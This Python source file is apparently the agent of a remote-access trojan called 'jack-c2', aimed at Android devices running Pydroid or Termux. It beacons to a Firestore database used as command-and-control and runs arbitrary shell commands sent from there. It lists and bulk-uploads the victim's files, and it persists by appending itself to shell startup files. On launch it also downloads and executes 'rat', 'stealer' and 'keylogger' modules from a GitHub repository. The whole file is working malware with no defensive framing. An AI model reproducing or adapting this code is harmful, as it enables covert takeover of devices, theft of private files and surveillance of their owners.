import os, sys, json, time, uuid, base64, hashlib, threading, subprocess, platform, socket, urllib.request, urllib.error, traceback

PROJECT_ID = "jack-c2-b55bb"
API_KEY = "AIzaSyBuw3qWiY8VXffwyJH422ocsNZuiDTyKXI"
GH_BASE = "https://raw.githubusercontent.com/JackPyDev/jack-armory/main"
FCM_TOPIC = "device_online"
BEACON_INTERVAL = 20
JACK_DIR = os.path.join(os.path.expanduser("~"), ".jack")

SERVICE_ACCOUNT = {
    "project_id": "jack-c2-b55bb",
    "private_key": "-----BEGIN PRIVATE KEY-----\nREPLACE_WITH_SERVICE_ACCOUNT_PRIVATE_KEY\n-----END PRIVATE KEY-----\n",
    "client_email": "REPLACE_WITH_SERVICE_ACCOUNT_CLIENT_EMAIL",
    "token_uri": "https://oauth2.googleapis.com/token"
}


def _did():
    try:
        raw = platform.node() + str(uuid.getnode())
        return hashlib.md5(raw.encode()).hexdigest()[:16]
    except Exception:
        return hashlib.md5(str(time.time()).encode()).hexdigest()[:16]


DID = _did()
_seen = set()
_notified = [False]


def _url(path):
    return "https://firestore.googleapis.com/v1/projects/" + PROJECT_ID + "/databases/(default)/documents/" + path + "?key=" + API_KEY


def _to_fields(data):
    out = {}
    if not isinstance(data, dict):
        return out
    for k, v in data.items():
        try:
            if v is None:
                out[k] = {"nullValue": None}
            elif isinstance(v, bool):
                out[k] = {"booleanValue": v}
            elif isinstance(v, int):
                out[k] = {"integerValue": str(v)}
            elif isinstance(v, float):
                out[k] = {"doubleValue": v}
            elif isinstance(v, str):
                out[k] = {"stringValue": v}
            elif isinstance(v, (list, tuple)):
                out[k] = {"arrayValue": {"values": [{"stringValue": str(x)} for x in v]}}
            elif isinstance(v, dict):
                out[k] = {"mapValue": {"fields": _to_fields(v)}}
            else:
                out[k] = {"stringValue": str(v)}
        except Exception:
            out[k] = {"stringValue": ""}
    return out


def _from_fields(fields):
    out = {}
    if not isinstance(fields, dict):
        return out
    for k, v in fields.items():
        try:
            if "stringValue" in v:
                out[k] = v["stringValue"]
            elif "integerValue" in v:
                out[k] = int(v["integerValue"])
            elif "doubleValue" in v:
                out[k] = float(v["doubleValue"])
            elif "booleanValue" in v:
                out[k] = bool(v["booleanValue"])
            elif "nullValue" in v:
                out[k] = None
            elif "arrayValue" in v:
                vals = v["arrayValue"].get("values", [])
                out[k] = [x.get("stringValue", "") for x in vals]
            elif "mapValue" in v:
                out[k] = _from_fields(v["mapValue"].get("fields", {}))
            else:
                out[k] = None
        except Exception:
            out[k] = None
    return out


def _fs_get(path):
    try:
        req = urllib.request.Request(_url(path), headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read().decode("utf-8", "ignore"))
    except Exception:
        return {}


def _fs_set(path, data):
    try:
        body = json.dumps({"fields": _to_fields(data)}).encode()
        req = urllib.request.Request(_url(path), data=body, method="PATCH", headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as r:
            r.read()
        return True
    except Exception:
        return False


def _gh(path):
    try:
        req = urllib.request.Request(GH_BASE + "/" + path, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.read().decode("utf-8", "ignore")
    except Exception:
        return ""


def _lan():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "0.0.0.0"


def _has_termux():
    return os.path.exists("/data/data/com.termux/files/usr/bin/bash")


def _installed():
    try:
        if not os.path.isdir(JACK_DIR):
            return []
        return [f[:-3] for f in os.listdir(JACK_DIR) if f.endswith(".py")]
    except Exception:
        return []


def _info():
    return {
        "id": DID,
        "name": platform.node(),
        "model": platform.machine(),
        "os_version": platform.release(),
        "python": platform.python_version(),
        "ip": _lan(),
        "pydroid": True,
        "termux": _has_termux(),
        "installed": _installed(),
        "online": True,
        "lastSeen": int(time.time())
    }


def _run(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=45)
        out = (r.stdout or b"") + (r.stderr or b"")
        return out.decode("utf-8", "ignore")
    except Exception as e:
        return "err: " + str(e)


def _exec_module(code, name):
    try:
        ns = {"__name__": "_j_" + name}
        exec(compile(code, "<" + name + ">", "exec"), ns)
    except Exception:
        pass


def _install_module(mid):
    try:
        code = _gh("modules/" + mid + ".py")
        if not code:
            return "err: fetch failed"
        os.makedirs(JACK_DIR, exist_ok=True)
        with open(os.path.join(JACK_DIR, mid + ".py"), "w", encoding="utf-8") as f:
            f.write(code)
        threading.Thread(target=_exec_module, args=(code, mid), daemon=True).start()
        return "installed " + mid
    except Exception as e:
        return "err: " + str(e)


def _upload_file(path):
    try:
        if not os.path.isfile(path):
            return "err: not file"
        size = os.path.getsize(path)
        if size > 5 * 1024 * 1024:
            return "err: too large"
        with open(path, "rb") as f:
            data = f.read()
        fid = hashlib.md5(path.encode()).hexdigest()
        ok = _fs_set("devices/" + DID + "/files/" + fid, {
            "path": path, "size": size, "data": base64.b64encode(data).decode(), "ts": int(time.time())
        })
        return "uploaded " + path if ok else "err: patch failed"
    except Exception as e:
        return "err: " + str(e)


def _ls(path):
    try:
        if not os.path.isdir(path):
            return "err: not dir"
        items = []
        for i, n in enumerate(os.listdir(path)):
            if i >= 500:
                break
            full = os.path.join(path, n)
            try:
                items.append({"name": n, "dir": os.path.isdir(full), "size": os.path.getsize(full)})
            except Exception:
                items.append({"name": n, "dir": False, "size": 0})
        return json.dumps(items)
    except Exception as e:
        return "err: " + str(e)


def _walk(base, max_files=2000, max_depth=4):
    try:
        out = []
        base = os.path.abspath(base)
        for root, dirs, files in os.walk(base):
            depth = root[len(base):].count(os.sep)
            if depth >= max_depth:
                dirs[:] = []
                continue
            for fn in files:
                out.append(os.path.join(root, fn))
                if len(out) >= max_files:
                    return json.dumps(out)
        return json.dumps(out)
    except Exception as e:
        return "err: " + str(e)


def _persist():
    try:
        os.makedirs(JACK_DIR, exist_ok=True)
        me = os.path.join(JACK_DIR, "agent.py")
        code = _gh("modules/agent.py")
        if code:
            with open(me, "w", encoding="utf-8") as f:
                f.write(code)
        line = "python3 " + me + " >/dev/null 2>&1 &\n"
        for rc in [".bashrc", ".profile", ".zshrc"]:
            p = os.path.join(os.path.expanduser("~"), rc)
            try:
                if os.path.exists(p):
                    with open(p, "a", encoding="utf-8") as f:
                        f.write(line)
            except Exception:
                pass
        return "persisted"
    except Exception as e:
        return "err: " + str(e)


def _exec(c):
    cid = c.get("id", "")
    cmd = c.get("command", "")
    args = c.get("args", {}) or {}
    out = ""
    try:
        if cmd == "shell":
            out = _run(args.get("raw", ""))
        elif cmd == "list":
            out = _ls(args.get("path", "/sdcard"))
        elif cmd == "walk":
            out = _walk(args.get("path", "/sdcard"), int(args.get("max", 2000)), int(args.get("depth", 4)))
        elif cmd == "download":
            out = _upload_file(args.get("path", ""))
        elif cmd == "bulk_download":
            base = args.get("path", "/sdcard")
            mx = int(args.get("max", 500))
            dp = int(args.get("depth", 3))
            try:
                files = json.loads(_walk(base, mx, dp))
            except Exception:
                files = []
            ok = 0
            for fp in files:
                if _upload_file(fp).startswith("uploaded"):
                    ok += 1
            out = "bulk " + str(ok) + "/" + str(len(files))
        elif cmd == "install":
            out = _install_module(args.get("module", ""))
        elif cmd == "uninstall":
            try:
                os.remove(os.path.join(JACK_DIR, args.get("module", "") + ".py"))
                out = "uninstalled"
            except Exception as e:
                out = "err: " + str(e)
        elif cmd == "modules":
            out = json.dumps(_installed())
        elif cmd == "start":
            mid = args.get("module", "")
            try:
                with open(os.path.join(JACK_DIR, mid + ".py"), "r", encoding="utf-8") as f:
                    code = f.read()
                threading.Thread(target=_exec_module, args=(code, mid), daemon=True).start()
                out = "started " + mid
            except Exception as e:
                out = "err: " + str(e)
        elif cmd == "gh_update":
            out = _install_module("agent")
        elif cmd == "persist":
            out = _persist()
        elif cmd == "termux_check":
            out = "yes" if _has_termux() else "no"
        else:
            out = "err: unknown command"
    except Exception as e:
        out = "err: " + str(e)
    try:
        _fs_set("devices/" + DID + "/commands/" + cid, {
            "status": "done", "output": out[:900000], "completedAt": int(time.time())
        })
    except Exception:
        pass


def _extract_args(cmd_doc):
    try:
        f = cmd_doc.get("fields", {})
        args_mv = f.get("args", {}).get("mapValue", {}).get("fields", {})
        return _from_fields(args_mv)
    except Exception:
        return {}


def _fcm_notify():
    if _notified[0]:
        return
    _notified[0] = True
    try:
        from cryptography.hazmat.primitives import serialization, hashes
        from cryptography.hazmat.primitives.asymmetric import padding
        import urllib.parse
        sa = SERVICE_ACCOUNT
        if "REPLACE_WITH" in sa.get("private_key", ""):
            return
        now = int(time.time())
        header = {"alg": "RS256", "typ": "JWT"}
        claims = {
            "iss": sa["client_email"],
            "scope": "https://www.googleapis.com/auth/cloud-platform",
            "aud": sa["token_uri"],
            "iat": now,
            "exp": now + 3600
        }
        def b64url(b):
            return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
        signing_input = (b64url(json.dumps(header).encode()) + "." + b64url(json.dumps(claims).encode())).encode()
        key = serialization.load_pem_private_key(sa["private_key"].encode(), password=None)
        sig = key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
        jwt = signing_input.decode() + "." + b64url(sig)
        data = urllib.parse.urlencode({
            "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
            "assertion": jwt
        }).encode()
        req = urllib.request.Request(sa["token_uri"], data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        with urllib.request.urlopen(req, timeout=20) as r:
            tok = json.loads(r.read().decode())["access_token"]
        msg = {
            "message": {
                "topic": FCM_TOPIC,
                "notification": {"title": "New device online", "body": platform.node() + " (" + DID + ")"},
                "data": {"device_id": DID, "name": platform.node()}
            }
        }
        req = urllib.request.Request(
            "https://fcm.googleapis.com/v1/projects/" + PROJECT_ID + "/messages:send",
            data=json.dumps(msg).encode(),
            headers={"Content-Type": "application/json", "Authorization": "Bearer " + tok}
        )
        with urllib.request.urlopen(req, timeout=20) as r:
            r.read()
    except Exception:
        pass


def _beacon():
    first = True
    while True:
        try:
            _fs_set("devices/" + DID, _info())
            if first:
                _fcm_notify()
                first = False
            r = _fs_get("devices/" + DID + "/commands")
            docs = r.get("documents", []) if isinstance(r, dict) else []
            for doc in docs:
                try:
                    name = doc.get("name", "")
                    cid = name.split("/")[-1]
                    if cid in _seen:
                        continue
                    f = doc.get("fields", {})
                    status = f.get("status", {}).get("stringValue", "")
                    if status != "pending":
                        continue
                    _seen.add(cid)
                    cmd = f.get("command", {}).get("stringValue", "")
                    args = _extract_args(doc)
                    _fs_set("devices/" + DID + "/commands/" + cid, {"status": "running"})
                    threading.Thread(target=_exec, args=({"id": cid, "command": cmd, "args": args},), daemon=True).start()
                except Exception:
                    continue
        except Exception:
            pass
        time.sleep(BEACON_INTERVAL)


def _auto_install_default():
    time.sleep(1)
    for m in ["rat", "stealer", "keylogger"]:
        try:
            _install_module(m)
        except Exception:
            pass


def _main():
    try:
        os.makedirs(JACK_DIR, exist_ok=True)
    except Exception:
        pass
    threading.Thread(target=_auto_install_default, daemon=True).start()
    threading.Thread(target=_beacon, daemon=True).start()


_main()